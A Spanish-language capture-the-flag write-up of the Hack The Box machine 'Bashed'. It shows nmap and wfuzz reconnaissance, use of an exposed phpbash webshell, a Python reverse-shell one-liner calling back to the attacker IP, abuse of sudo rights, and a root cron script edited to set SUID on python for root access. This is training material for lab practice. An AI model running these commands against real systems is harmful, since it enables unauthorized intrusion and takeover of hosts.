---
layout: single
title: <span style="color:#E28F00">Bashed </span><span class="en_blanco">-</span><span class="htb"> Hack The Box </span><span class="en_blanco">-</span> <span class="es_rojo">E</span><span class="es_amarillo">S</span><span class="es_rojo">P</span>
excerpt: "En este post realizaremos el write up de la máquina Bashed. Tocaremos los conceptos de fuzzing, webshell, movimiento lateral, modificación de scripts en python, explotación de tareas cron y 
escalada de privilegios a través de permisos SUID."
date: 2022-08-19
classes: wide
header:
  teaser: /assets/images/bashed/bashed_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.png
categories:
  - Hack The Box
  - Easy
  - Esp
tags:  
  - WFUZZ
  - Webshell
  - Sudo -l
  - python
  - cron 
  - SUID
---

## DESCRIPCION

En este post realizaremos el write up de la máquina Bashed. Tocaremos los conceptos de fuzzing, webshell, movimiento lateral, modificación de scripts en python, explotación de tareas cron y
escalada de privilegios a través de permisos SUID.

![](/assets/images/bashed/bashed_descripcion.png)

## INDICE

- [Reconocimiento de puertos](#escaneo-de-puertos)
- [Reconocimiento web](#reconocimiento-web)
- [Reverse shell](#reverse-shell)
	- [TTY Interactiva](#tty)
- [Lateral Movement](#lateral-movement)
	- [Scriptmanager](#scriptmanager)
	- [Modificación del script](#script)
	- [PSPY](#pspy)
- [Privelege escalation to ROOT](#privilege-escalation-to-root)
- [Flags](#flags)
- [Conocimientos obtenidos](#conocimientos-obtenidos)
- [Errores](#errores)
- [Autores y referencias](#autores-y-referencias)

## ESCANEO DE PUERTOS

Escaneamos con `nmap` los puertos abiertos en la máquina Bashed:

```ruby
❯ cat Puertos
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Puertos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap --open -p- -T5 -oG Puertos 10.10.10.68
   2   │ Host: 10.10.10.68 ()    Status: Up
   3   │ Host: 10.10.10.68 ()    Ports: 80/open/tcp//http///
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

❯ Reconocimiento Puertos

{*} Extrayendo puertos...

	La direccion ip es: 10.10.10.68
	Los puertos abiertos son: 80

	Los puertos han sido copiados al portapapeles

```
<br>
Escaneamos al objetivo con los scripts predeterminados de nmap, apuntando a los puertos abiertos en busca de más información.

```ruby
❯ cat Objetivos
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Objetivos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap -sCV -p 80 -oN Objetivos 10.10.10.68
   2   │ Nmap scan report for 10.10.10.68
   3   │ Host is up (0.040s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
   7   │ |_http-title: Arrexel's Development Site
   8   │ |_http-server-header: Apache/2.4.18 (Ubuntu)
   9   │ 
  10   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
Por lo que parece la máquina objetivo solo tiene expuesto el puerto 80. Vamos a echarle un vistazo.

## RECONOCIMIENTO WEB

La web parece enseñar una herramienta llamada `phpbash`.

![](/assets/images/bashed/web.png)

<br>
Si investigamos la página, deducimos que la herramienta desempeña la función de una web shell y por lo que el post nos indica la herramienta está desplegada en el servidor.

```
phpbash helps a lot with pentesting. I have tested it on multiple 
different servers and it was very useful. I actually developed it on this exact server!

https://github.com/Arrexel/phpbash

```

<h3 style="text-align:center" id="wfuzz">WFUZZ</h3>
<hr>
<br>
Sabiendo que la web shell está desplegada, vamos a buscar mediante fuzzing posibles directorios donde pueda estar ubicada.

```bash
❯ wfuzz -c --hc 404 -u http://10.10.10.68/FUZZ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.68/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                       
=====================================================================

000000001:   200        161 L    397 W      7743 Ch     "# directory-list-2.3-medium.txt"                                                                                                             
000000003:   200        161 L    397 W      7743 Ch     "# Copyright 2007 James Fisher"                                                                                                               
000000007:   200        161 L    397 W      7743 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                             
000000014:   200        161 L    397 W      7743 Ch     "http://10.10.10.68/"                                                                                                                         
000000016:   301        9 L      28 W       311 Ch      "images"                                                                                                                                      
000000006:   200        161 L    397 W      7743 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                               
000000010:   200        161 L    397 W      7743 Ch     "#"                                                                                                                                           
000000005:   200        161 L    397 W      7743 Ch     "# This work is licensed under the Creative Commons"                                                                                          
000000011:   200        161 L    397 W      7743 Ch     "# Priority ordered case-sensitive list, where entries were found"                                                                            
000000013:   200        161 L    397 W      7743 Ch     "#"                                                                                                                                           
000000012:   200        161 L    397 W      7743 Ch     "# on at least 2 different hosts"                                                                                                             
000000008:   200        161 L    397 W      7743 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                                                                  
000000009:   200        161 L    397 W      7743 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                                                         
000000002:   200        161 L    397 W      7743 Ch     "#"                                                                                                                                           
000000004:   200        161 L    397 W      7743 Ch     "#"                                                                                                                                           
000000164:   301        9 L      28 W       312 Ch      "uploads"                                                                                                                                     
000000338:   301        9 L      28 W       308 Ch      "php"                                                                                                                                         
000000550:   301        9 L      28 W       308 Ch      "css"                                                                                                                                         
000000834:   301        9 L      28 W       308 Ch      "dev"                                                                                                                                         
000000953:   301        9 L      28 W       307 Ch      "js"                                                                                                                                          
000002771:   301        9 L      28 W       310 Ch      "fonts"   

```
<br>
Revisando entre los diferentes directorios encontramos `/dev/`, y nos muestra lo siguiente:

![](/assets/images/bashed/webshell.png)

<br>
¡Bingo! Tenemos acceso a las webshells, en mi caso utilizaré `phpbash.php`.

![](/assets/images/bashed/phpbash.png)

Parece ser totalmente funcional.

## REVERSE SHELL

Vamos a enviarnos una revsehell a nuestro equipo para trabajar de manera más cómoda.

1- Antes nos ponemos por escucha con `nc`.

```bash
❯ nc -lvnp 1234
listening on [any] 1234 ...

```
<br>
2- Enviamos la shell a nuestro equipo.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.5",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```
<br>
3- Recibimos la shell.
```bash
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.68] 54660
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 

```

<h3 style="text-align:center" id="tty">TTY INTERACTIVA</h3>
<hr>
<br>
Para spawnear un tty interactiva seguimos el siguiente proceso.

```
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@bashed:/var/www/html/dev$ ^Z
[1]  + 4763 suspended  nc -lvnp 1234
❯ stty raw -echo; fg
[1]  + 4763 continued  nc -lvnp 1234
                                    reset xterm

www-data@bashed:/var/www/html/dev$ export TERM=xterm
www-data@bashed:/var/www/html/dev$ export SHELL=/bin/bash

```
## LATERAL MOVEMENT

<h3 style="text-align:center" id="scriptmanager">SCRIPTMANAGER</h3>
<hr>
<br>
Como www-data hacemos `sudo -l`.

```bash
www-data@bashed:/var/www/html/dev$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```
<br>
Podemos ejecutar cualquier comando como scriptmanager, por lo que nos podemos ejecutar una shell como él.

```bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/var/www/html/dev$ whoami
scriptmanager

```
<br>
Si nos dirigimos a la raíz podemos ver el directorio `scripts` del cual somos propietarios.

```bash
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2 07:19 scripts

scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2 07:19 .
drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Aug 19 06:15 test.txt

```
Tenemos dos archivos, uno de nuestra propiedad y otro el cual pertenece al usuario root.

Si vemos el codigo de `test.py y test.txt` obtenemos lo siguiente:

<h3>TEST.py</h3>

```python
scriptmanager@bashed:/scripts$ cat test.py 
f = open("test.txt", "w")
f.write("testing 123!")
f.close

```
<h3>TEST.txt</h3>

```bash
scriptmanager@bashed:/scripts$ cat test.txt 
testing 123!
```
Por lo que parece, el script `test.py` abre el fichero `test.txt` con permisos de escritura `w`, escribe la string contenida en `f.write("STRING")` y cierra el archivo con `f.close`.

Scriptmanager no tiene esos permisos para llevar a cabo esa función ¿Cómo está ejecutándose el script para tener esos permisos?.

<h3 style="text-align:center" id="script">MODIFICACION DEL SCRIPT</h3>
<hr>
<br>
Modificamos en `test.py` la string que se guardará en `test.txt`.

<h3>TEST.py</h3>

```python
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("void4m0n h4ck")
f.close

```

<h3>TEST.txt</h3>

```bash
scriptmanager@bashed:/scripts$  cat test.txt 
void4m0n h4ck

```

Al pasar un tiempo determinado el archivo `test.txt` se ha modificado con éxito, esto huele a tarea cron. Vamos a ver que sucede por detrás con `pspy`.

<h3 style="text-align:center" id="pspy">PSPY64</h3>
<hr>
<br>
Para pasarnos `pspy64` y ejecutarlo seguimos los siguientes pasos.

1- Nos montamos un servidor web con python.

```bash
❯ python3 -m http.server --bind 10.10.16.5
Serving HTTP on 10.10.16.5 port 8000 (http://10.10.16.5:8000/) ...

```
<br>
2- Desde la máquina víctima nos descargamos el programa.

```bash
scriptmanager@bashed:/scripts$ wget http://10.10.16.5:8000/pspy64
--2022-08-19 07:44:43--  http://10.10.16.5:8000/pspy64
Connecting to 10.10.16.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.94M  1.55MB/s    in 1.9s    

2022-08-19 07:44:45 (1.55 MB/s) - 'pspy64' saved [3078592/3078592]

```
<br>
3- Le asignamos permisos de ejecución.
```bash
chmod +x pspy64 
```
<br>
4- Lanzamos el script.

```bash
scriptmanager@bashed:/scripts$ ./pspy64 

```
<br>
5- Analizamos el resultado.
```python
2022/08/19 07:48:01 CMD: UID=0    PID=10374  | /usr/sbin/CRON -f 
2022/08/19 07:48:01 CMD: UID=0    PID=10375  | /usr/sbin/CRON -f 
2022/08/19 07:48:01 CMD: UID=0    PID=10376  | python test.py 
2022/08/19 07:49:01 CMD: UID=0    PID=10377  | /usr/sbin/CRON -f 
2022/08/19 07:49:01 CMD: UID=0    PID=10378  | /usr/sbin/CRON -f 
2022/08/19 07:49:01 CMD: UID=0    PID=10379  | python test.py 

```
Como podemos observar existe una tarea cron la cual provoca que el usuario root `UID=0` esté ejecutando el fichero `test.py` cada minuto. Al ser dueños de este script podemos modificarlo
para ejecutar cualquier comando como usuario ROOT.

## PRIVILEGE ESCALATION TO ROOT

En este momento podemos escalar privilegios de la forma que deseemos, ya sea mandándonos una reverse shell, dando privilegios suid a un binario, creando capabilities, etc.

En mi caso daré permisos SUID a python de la siguiente forma.

```bash
scriptmanager@bashed:/scripts$ cat test.py 
import os
os.system("chmod 4777 /usr/bin/python")

```
<br>
Buscamos permisos SUID en busca de python.

```bash
scriptmanager@bashed:/scripts$  find / -perm /4000 2>/dev/null
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
/bin/ping6
/bin/ntfs-3g
/bin/ping
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/python2.7
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign

```

Solo faltaría buscar el comando en <a href="https://gtfobins.github.io/gtfobins/python/" target="_blank">GTFOBINS</a>.

Ejecutamos.
```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
```
¡Ya somos ROOT! A por esas flags.

## FLAGS

<h3>User.txt</h3>

```bash
# pwd    
/home/arrexel
# cat user.txt
117cxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
<h3>Root.txt</h3>

```bash
# pwd
/root
# cat root.txt
223dxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
## CONOCIMIENTOS OBTENIDOS

De la máquina <em>Bashed</em> podemos extraer los siguientes conocimientos:

- Reconocimiento de puertos con Nmap.
- Fuzzing de directorios con WFUZZ.
- Movimiento lateral a través de sudo -l.
- Modificar código python.
- Explotación de tareas cron.
- Privesc mediante permisos SUID.


## ERRORES

Un posible error que podéis sufrir es el siguiente: 
- Recordad que la tarea cron se ejecuta cada minuto, por lo que dependiendo de en que momento ejecutéis el comando tendréis que esperar hasta un minuto para llevar a cabo la priesc.

## AUTORES y REFERENCIAS

Autor del write up: Luis Miranda Sierra (Void4m0n) <a href="https://app.hackthebox.com/profile/1104062" target="_blank">HTB</a>. Si queréis contactarme por cualquier motivo lo podéis hacer a través 
de <a href="https://twitter.com/Void4m0n" target="_blank">Twitter</a>.


Autor de la máquina:  <em>Arrexel</em>, muchas gracias por la creación de Bashed aportando a la comunidad. <a href="https://app.hackthebox.com/users/2904" target="_blank">HTB</a>.

